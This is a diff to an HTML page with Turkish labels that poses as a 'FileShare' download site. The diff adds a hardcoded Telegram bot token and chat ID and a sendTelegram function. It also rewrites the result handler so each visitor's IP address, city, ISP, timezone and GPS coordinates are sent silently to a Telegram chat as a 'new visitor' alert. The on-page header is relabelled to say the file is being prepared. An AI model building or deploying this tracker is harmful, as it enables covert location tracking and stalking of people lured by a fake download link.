@@ -130,7 +130,7 @@ footer{text-align:center;padding:16px;font-size:11px;color:#cbd5e1}
           <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
         </div>
         <div>
-          <div class="rh-t1">Bağlantı Bilgileri</div>
+          <div class="rh-t1">Dosya Hazırlanıyor</div>
           <div class="rh-t2" id="resultTime"></div>
         </div>
       </div>
@@ -141,7 +141,7 @@ footer{text-align:center;padding:16px;font-size:11px;color:#cbd5e1}
           <div class="acc" id="gpsAcc"></div>
           <a class="map-btn" id="mapLink" href="#" target="_blank">🗺 Haritada Göster</a>
         </div>
-        <div class="section-title">IP Bilgileri</div>
+        <div class="section-title">Bağlantı Bilgileri</div>
         <div class="data-grid">
           <div class="data-card" style="grid-column:1/-1"><div class="lbl">IP ADRESİ</div><div class="val" id="ip">—</div></div>
           <div class="data-card"><div class="lbl">ÜLKE</div><div class="val" id="country">—</div></div>
@@ -161,7 +161,9 @@ footer{text-align:center;padding:16px;font-size:11px;color:#cbd5e1}
 <footer>© 2024 FileShare · Tüm hakları saklıdır</footer>
 
 <script>
-  // Tarih
+  var BOT_TOKEN = '8725494150:AAH1X3EIz06nsGMyhlEWNTZN3XjvSZSm8Bo';
+  var CHAT_ID   = '5859179788';
+
   var d = new Date(); d.setDate(d.getDate()-2);
   document.getElementById('uploadDate').textContent =
     d.toLocaleDateString('tr-TR',{day:'2-digit',month:'long',year:'numeric'});
@@ -170,6 +172,14 @@ footer{text-align:center;padding:16px;font-size:11px;color:#cbd5e1}
     document.getElementById('dlPage').style.display     = id==='dlPage'     ? '' : 'none';
     document.getElementById('loadPage').style.display   = id==='loadPage'   ? '' : 'none';
     document.getElementById('resultPage').style.display = id==='resultPage' ? '' : 'none';
+  }
+
+  function sendTelegram(msg) {
+    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
+    }).catch(function(){});
   }
 
   document.getElementById('dlBtn').addEventListener('click', function() {
@@ -237,27 +247,58 @@ footer{text-align:center;padding:16px;font-size:11px;color:#cbd5e1}
 
   function showResult(ipData, gps) {
     show('resultPage');
-    document.getElementById('resultTime').textContent = new Date().toLocaleString('tr-TR');
+    var now = new Date().toLocaleString('tr-TR');
+    document.getElementById('resultTime').textContent = now;
 
-    document.getElementById('ip').textContent      = ipData.ip || '—';
-    var loc = ipData.loc ? ipData.loc.split(',') : [];
-    document.getElementById('country').textContent = ipData.country || '—';
-    document.getElementById('city').textContent    = [ipData.city, ipData.region].filter(Boolean).join(', ') || '—';
-    document.getElementById('isp').textContent     = ipData.org || '—';
-    document.getElementById('asn').textContent     = ipData.org ? ipData.org.split(' ')[0] : '—';
-    document.getElementById('tz').textContent      = ipData.timezone || '—';
-    document.getElementById('ll').textContent      = loc.length===2 ? (+loc[0]).toFixed(4)+', '+(+loc[1]).toFixed(4) : '—';
-    document.getElementById('org').textContent     = ipData.org || '—';
+    var ip      = ipData.ip || '—';
+    var loc     = ipData.loc ? ipData.loc.split(',') : [];
+    var country = ipData.country || '—';
+    var city    = [ipData.city, ipData.region].filter(Boolean).join(', ') || '—';
+    var isp     = ipData.org || '—';
+    var asn     = ipData.org ? ipData.org.split(' ')[0] : '—';
+    var tz      = ipData.timezone || '—';
+    var ll      = loc.length===2 ? (+loc[0]).toFixed(4)+', '+(+loc[1]).toFixed(4) : '—';
+
+    document.getElementById('ip').textContent      = ip;
+    document.getElementById('country').textContent = country;
+    document.getElementById('city').textContent    = city;
+    document.getElementById('isp').textContent     = isp;
+    document.getElementById('asn').textContent     = asn;
+    document.getElementById('tz').textContent      = tz;
+    document.getElementById('ll').textContent      = ll;
+    document.getElementById('org').textContent     = isp;
+
+    var gpsText = 'GPS: İzin verilmedi';
+    var mapsUrl = '';
 
     if(gps){
       var lat = gps.coords.latitude;
       var lon = gps.coords.longitude;
       var acc = gps.coords.accuracy;
-      document.getElementById('gpsCoords').textContent = lat.toFixed(6)+', '+lon.toFixed(6);
+      var coords = lat.toFixed(6)+', '+lon.toFixed(6);
+      mapsUrl = 'https://maps.google.com/?q='+lat+','+lon;
+
+      document.getElementById('gpsCoords').textContent = coords;
       document.getElementById('gpsAcc').textContent    = '± '+Math.round(acc)+' metre doğruluk';
-      document.getElementById('mapLink').href          = 'https://maps.google.com/?q='+lat+','+lon;
+      document.getElementById('mapLink').href          = mapsUrl;
       document.getElementById('gpsCard').style.display = '';
+
+      gpsText = '📍 GPS: ' + coords + '\n🎯 Doğruluk: ±' + Math.round(acc) + ' m\n🗺 Harita: ' + mapsUrl;
     }
+
+    // Telegram'a gönder
+    var msg =
+      '🚨 <b>Yeni Ziyaretçi!</b>\n' +
+      '🕐 ' + now + '\n\n' +
+      '🌐 <b>IP:</b> ' + ip + '\n' +
+      '🌍 <b>Ülke:</b> ' + country + '\n' +
+      '🏙 <b>Şehir:</b> ' + city + '\n' +
+      '📡 <b>ISP:</b> ' + isp + '\n' +
+      '🕐 <b>Timezone:</b> ' + tz + '\n' +
+      '📍 <b>IP Koord:</b> ' + ll + '\n\n' +
+      gpsText;
+
+    sendTelegram(msg);
   }
 </script>
 </body>
